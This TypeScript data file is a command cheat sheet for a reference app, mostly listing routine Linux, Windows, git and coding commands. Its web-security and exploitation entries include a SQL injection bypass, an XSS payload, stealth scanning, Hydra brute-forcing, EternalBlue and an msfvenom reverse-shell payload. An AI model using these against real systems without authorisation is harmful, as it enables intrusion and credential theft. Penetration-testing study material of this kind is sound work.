export interface Command {
  name: string;
  syntax: string;
  os: 'linux' | 'windows' | 'mac' | 'agnostic';
  language?: string;
  category: 'file' | 'search' | 'permissions' | 'user' | 'process' | 'network' | 'system' | 'web' | 'code' | 'package' | 'exploit';
  description: string;
  example: string;
}

export const commandData: Command[] = [
  // --- FILE OPERATIONS ---
  { name: 'Print Working Directory', syntax: 'pwd', os: 'linux', category: 'file', description: 'Shows the full path of the directory you are currently in.', example: 'pwd' },
  { name: 'List Files', syntax: 'ls', os: 'linux', category: 'file', description: 'Lists files and folders in the current directory.', example: 'ls -la' },
  { name: 'List Files (Windows)', syntax: 'dir', os: 'windows', category: 'file', description: 'The Windows equivalent of ls. Shows everything in the folder.', example: 'dir /w' },
  { name: 'Change Directory', syntax: 'cd <path>', os: 'agnostic', category: 'file', description: 'Moves your current working directory to the specified path.', example: 'cd /home/user/Documents' },
  { name: 'Make Directory', syntax: 'mkdir <name>', os: 'agnostic', category: 'file', description: 'Creates a new folder.', example: 'mkdir projects' },
  { name: 'Remove File', syntax: 'rm <file>', os: 'linux', category: 'file', description: 'Deletes a file permanently.', example: 'rm oldfile.txt' },
  { name: 'Remove Directory', syntax: 'rm -r <dir>', os: 'linux', category: 'file', description: 'Recursively deletes a directory and all its contents.', example: 'rm -r old_project/' },
  { name: 'Copy File', syntax: 'cp <source> <dest>', os: 'linux', category: 'file', description: 'Copies a file from source to destination.', example: 'cp report.txt backup/' },
  { name: 'Move/Rename File', syntax: 'mv <source> <dest>', os: 'linux', category: 'file', description: 'Moves or renames a file.', example: 'mv old.txt new.txt' },
  { name: 'Display File Contents', syntax: 'cat <file>', os: 'linux', category: 'file', description: 'Outputs the entire contents of a file to the terminal.', example: 'cat /etc/passwd' },
  { name: 'Display File (Paged)', syntax: 'less <file>', os: 'linux', category: 'file', description: 'Shows file contents one page at a time.', example: 'less /var/log/syslog' },
  { name: 'Head of File', syntax: 'head -n 20 <file>', os: 'linux', category: 'file', description: 'Shows the first 20 lines of a file.', example: 'head -n 20 data.csv' },
  { name: 'Tail of File', syntax: 'tail -f <file>', os: 'linux', category: 'file', description: 'Shows the end of a file and updates in real time.', example: 'tail -f /var/log/apache2/access.log' },
  { name: 'Find Files by Name', syntax: 'find / -name "*.txt"', os: 'linux', category: 'file', description: 'Recursively searches the filesystem for files matching a pattern.', example: 'find /home -name "*.pdf"' },

  // --- PERMISSIONS & USERS ---
  { name: 'Change Permissions', syntax: 'chmod 755 <file>', os: 'linux', category: 'permissions', description: 'Modifies the read, write, and execute permissions of a file.', example: 'chmod +x script.sh' },
  { name: 'Change Owner', syntax: 'chown user:group <file>', os: 'linux', category: 'permissions', description: 'Changes the owner and group of a file.', example: 'chown root:root sensitive.conf' },
  { name: 'Switch User', syntax: 'su - <user>', os: 'linux', category: 'user', description: 'Switches to another user account.', example: 'su - root' },
  { name: 'Run as Superuser', syntax: 'sudo <command>', os: 'linux', category: 'user', description: 'Executes a command with elevated privileges.', example: 'sudo apt update' },
  { name: 'List Users', syntax: 'cat /etc/passwd', os: 'linux', category: 'user', description: 'Displays all user accounts on the system.', example: 'grep /bin/bash /etc/passwd' },
  { name: 'Add User', syntax: 'useradd -m <username>', os: 'linux', category: 'user', description: 'Creates a new user account with a home directory.', example: 'sudo useradd -m alice' },

  // --- PROCESSES & SYSTEM ---
  { name: 'List Processes', syntax: 'ps aux', os: 'linux', category: 'process', description: 'Shows all running processes with detailed information.', example: 'ps aux | grep nginx' },
  { name: 'Kill Process', syntax: 'kill -9 <PID>', os: 'linux', category: 'process', description: 'Immediately terminates a process by its ID.', example: 'kill -9 1234' },
  { name: 'Top Processes', syntax: 'top', os: 'linux', category: 'process', description: 'Displays a real-time view of running processes and resource usage.', example: 'top' },
  { name: 'Disk Space', syntax: 'df -h', os: 'linux', category: 'system', description: 'Displays disk usage in human-readable format.', example: 'df -h' },
  { name: 'Memory Usage', syntax: 'free -h', os: 'linux', category: 'system', description: 'Shows memory and swap usage in human-readable format.', example: 'free -h' },
  { name: 'System Uptime', syntax: 'uptime', os: 'linux', category: 'system', description: 'Shows how long the system has been running.', example: 'uptime' },
  { name: 'Reboot System', syntax: 'reboot', os: 'linux', category: 'system', description: 'Restarts the computer.', example: 'sudo reboot' },

  // --- NETWORK ---
  { name: 'Check IP Address', syntax: 'ip addr', os: 'linux', category: 'network', description: 'Displays network interface configuration and IP addresses.', example: 'ip addr show eth0' },
  { name: 'Check IP (Windows)', syntax: 'ipconfig', os: 'windows', category: 'network', description: 'Displays Windows network configuration.', example: 'ipconfig /all' },
  { name: 'Ping Host', syntax: 'ping <host>', os: 'agnostic', category: 'network', description: 'Tests connectivity to a remote host using ICMP.', example: 'ping 8.8.8.8' },
  { name: 'Trace Route', syntax: 'traceroute <host>', os: 'linux', category: 'network', description: 'Shows the network path taken to reach a host.', example: 'traceroute google.com' },
  { name: 'Stealth Port Scan', syntax: 'nmap -sS <target>', os: 'linux', category: 'network', description: 'Performs a TCP SYN scan, which is harder to detect.', example: 'nmap -sS 192.168.1.1' },
  { name: 'Service Fingerprint', syntax: 'nmap -sV <target>', os: 'linux', category: 'network', description: 'Determines what software and versions are running on open ports.', example: 'nmap -sV 192.168.1.1' },
  { name: 'Full Port Scan', syntax: 'nmap -p- <target>', os: 'linux', category: 'network', description: 'Scans all 65,535 TCP ports.', example: 'nmap -p- 10.0.0.5' },
  { name: 'Netcat Listener', syntax: 'nc -lvnp 4444', os: 'linux', category: 'network', description: 'Starts a Netcat listener on port 4444.', example: 'nc -lvnp 4444' },
  { name: 'Curl GET Request', syntax: 'curl http://target.com', os: 'linux', category: 'network', description: 'Makes an HTTP GET request and prints the response.', example: 'curl -I http://target.com' },
  { name: 'Wget Download', syntax: 'wget <url>', os: 'linux', category: 'network', description: 'Downloads a file from the internet.', example: 'wget https://example.com/file.zip' },
  { name: 'SSH Remote Login', syntax: 'ssh user@host', os: 'linux', category: 'network', description: 'Securely connects to a remote server via SSH.', example: 'ssh admin@192.168.1.10' },

  // --- WEB SECURITY ---
  { name: 'Basic SQLi Bypass', syntax: "' OR '1'='1", os: 'agnostic', category: 'web', description: 'Classic payload to bypass login forms by forcing a TRUE condition.', example: "admin' OR '1'='1" },
  { name: 'SQLMap Automate', syntax: 'sqlmap -u "<URL>" --dbs', os: 'linux', category: 'web', description: 'Automatically detects SQL injection and lists databases.', example: 'sqlmap -u "http://target.com/id=1" --dbs' },
  { name: 'Gobuster Directories', syntax: 'gobuster dir -u <URL> -w <wordlist>', os: 'linux', category: 'web', description: 'Brute-forces hidden directories on a web server.', example: 'gobuster dir -u http://target.com -w common.txt' },
  { name: 'Burp Intercept Toggle', syntax: 'Ctrl+Shift+P', os: 'agnostic', category: 'web', description: 'Burp Suite shortcut to toggle Intercept on/off.', example: 'Shortcut in Burp' },
  { name: 'XSS Payload', syntax: '<script>alert(1)</script>', os: 'agnostic', category: 'web', description: 'Basic reflected XSS payload to test for script injection.', example: '<script>alert(document.domain)</script>' },

  // --- EXPLOITATION ---
  { name: 'Start Metasploit', syntax: 'msfconsole', os: 'linux', category: 'exploit', description: 'Launches the Metasploit Framework console.', example: 'msfconsole' },
  { name: 'Search MSF Modules', syntax: 'search <keyword>', os: 'linux', category: 'exploit', description: 'Searches Metasploit for exploits, payloads, or auxiliary modules.', example: 'search eternalblue' },
  { name: 'Use MSF Module', syntax: 'use <module_path>', os: 'linux', category: 'exploit', description: 'Selects a specific module to configure and run.', example: 'use exploit/windows/smb/ms17_010_eternalblue' },
  { name: 'Meterpreter Get UID', syntax: 'getuid', os: 'linux', category: 'exploit', description: 'Inside Meterpreter, shows the user identity of the compromised process.', example: 'getuid' },
  { name: 'MSFVenom Payload', syntax: 'msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format>', os: 'linux', category: 'exploit', description: 'Generates a custom payload executable.', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf' },
  { name: 'Hydra Brute Force', syntax: 'hydra -l <user> -P <wordlist> <service>://<target>', os: 'linux', category: 'exploit', description: 'Brute-forces credentials for various protocols.', example: 'hydra -l admin -P rockyou.txt ssh://192.168.1.1' },
  { name: 'John Crack Hashes', syntax: 'john --wordlist=<wordlist> <hashfile>', os: 'linux', category: 'exploit', description: 'Cracks password hashes using dictionary attacks.', example: 'john --wordlist=rockyou.txt hashes.txt' },

  // --- CODE & PACKAGES ---
  { name: 'Python Print', syntax: 'print()', os: 'agnostic', language: 'Python', category: 'code', description: 'Outputs text or variables to the screen in Python.', example: 'print("Hello World")' },
  { name: 'Python Input', syntax: 'input("Prompt: ")', os: 'agnostic', language: 'Python', category: 'code', description: 'Reads a line of text from the user.', example: 'name = input("Enter your name: ")' },
  { name: 'Python For Loop', syntax: 'for i in range(10):', os: 'agnostic', language: 'Python', category: 'code', description: 'Iterates over a sequence of numbers.', example: 'for i in range(5):\n    print(i)' },
  { name: 'Python If Statement', syntax: 'if x > 5:', os: 'agnostic', language: 'Python', category: 'code', description: 'Executes code conditionally based on a boolean expression.', example: 'if password == "secret":\n    print("Access granted")' },
  { name: 'Python Function', syntax: 'def my_func():', os: 'agnostic', language: 'Python', category: 'code', description: 'Defines a reusable block of code.', example: 'def greet(name):\n    return f"Hello, {name}"' },
  { name: 'Python Import', syntax: 'import <module>', os: 'agnostic', language: 'Python', category: 'code', description: 'Brings external libraries into your script.', example: 'import requests' },
  { name: 'Bash Echo', syntax: 'echo "text"', os: 'linux', category: 'code', description: 'Prints text to the terminal.', example: 'echo "Hello Terminal"' },
  { name: 'Bash Variable', syntax: 'NAME="value"', os: 'linux', category: 'code', description: 'Assigns a value to a shell variable.', example: 'USER="alice"\necho $USER' },
  { name: 'Bash If Statement', syntax: 'if [ condition ]; then fi', os: 'linux', category: 'code', description: 'Conditional execution in Bash.', example: 'if [ -f file.txt ]; then echo exists; fi' },
  { name: 'Bash For Loop', syntax: 'for i in {1..10}; do done', os: 'linux', category: 'code', description: 'Iterates over a range in Bash.', example: 'for i in {1..5}; do echo $i; done' },
  { name: 'Git Status', syntax: 'git status', os: 'agnostic', category: 'package', description: 'Shows the current state of the working directory.', example: 'git status' },
  { name: 'Git Add', syntax: 'git add <file>', os: 'agnostic', category: 'package', description: 'Stages changes for the next commit.', example: 'git add .' },
  { name: 'Git Commit', syntax: 'git commit -m "message"', os: 'agnostic', category: 'package', description: 'Records staged changes in the repository history.', example: 'git commit -m "Fix login bug"' },
  { name: 'Git Push', syntax: 'git push origin main', os: 'agnostic', category: 'package', description: 'Uploads local commits to a remote repository.', example: 'git push origin main' },
  { name: 'Git Pull', syntax: 'git pull', os: 'agnostic', category: 'package', description: 'Downloads changes from the remote repository.', example: 'git pull origin main' },
  { name: 'Apt Update', syntax: 'sudo apt update', os: 'linux', category: 'package', description: 'Updates the package list on Debian-based systems.', example: 'sudo apt update && sudo apt upgrade' },
  { name: 'Apt Install', syntax: 'sudo apt install <package>', os: 'linux', category: 'package', description: 'Installs a software package.', example: 'sudo apt install nmap' },
  { name: 'Docker Run', syntax: 'docker run -d -p 80:80 nginx', os: 'linux', category: 'package', description: 'Runs a container in detached mode with port mapping.', example: 'docker run -it ubuntu bash' },
  { name: 'Docker PS', syntax: 'docker ps', os: 'linux', category: 'package', description: 'Lists running Docker containers.', example: 'docker ps -a' },
  { name: 'NPM Install', syntax: 'npm install <package>', os: 'agnostic', language: 'JavaScript', category: 'package', description: 'Installs a Node.js package.', example: 'npm install express' },
  { name: 'Node Run Script', syntax: 'node <file.js>', os: 'agnostic', language: 'JavaScript', category: 'code', description: 'Executes a JavaScript file with Node.js.', example: 'node server.js' }
];
